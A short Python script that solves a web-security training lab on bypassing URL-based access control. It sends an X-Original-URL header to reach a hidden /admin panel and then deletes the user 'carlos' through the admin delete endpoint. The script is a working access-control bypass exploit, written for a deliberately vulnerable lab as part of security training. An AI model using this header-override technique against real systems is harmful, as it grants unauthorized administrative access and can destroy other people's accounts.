##################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: URL-based access control can be circumvented
#
# Steps: 1. Fetch admin panel via X-Original-URL header
#        2. Delete carlos
#
##################################################################

###########
# imports
###########
import requests
from colorama import Fore

# change this to your lab URL
url = "https://0a060022045220ac820608e1006d00a1.web-security-academy.net"

try:
    # set header
    headers = {"X-Original-Url": "/admin"}
    
    # fetch admin panel
    # this step is not necessary in the script, you can do step 4 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(url, headers=headers)
    
    if admin_panel.status_code == 200:
        print(Fore.WHITE + "1. Fetching admin panel.. " + Fore.GREEN + "OK")

        try:
            # set header  
            headers = {"X-Original-Url": "/admin/delete"}
            
            # delete carlos
            delete_carlos = requests.get(f"{url}?username=carlos", headers=headers)
            
            print(Fore.WHITE + "2. Deleting carlos.. " + Fore.GREEN + "OK")
            
            print(Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        
        except:
            print(Fore.RED + "[!] Failed to delete carlos through exception")

    else:
        print(Fore.RED + "[!] Failed to fetch admin panel")

except:
    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
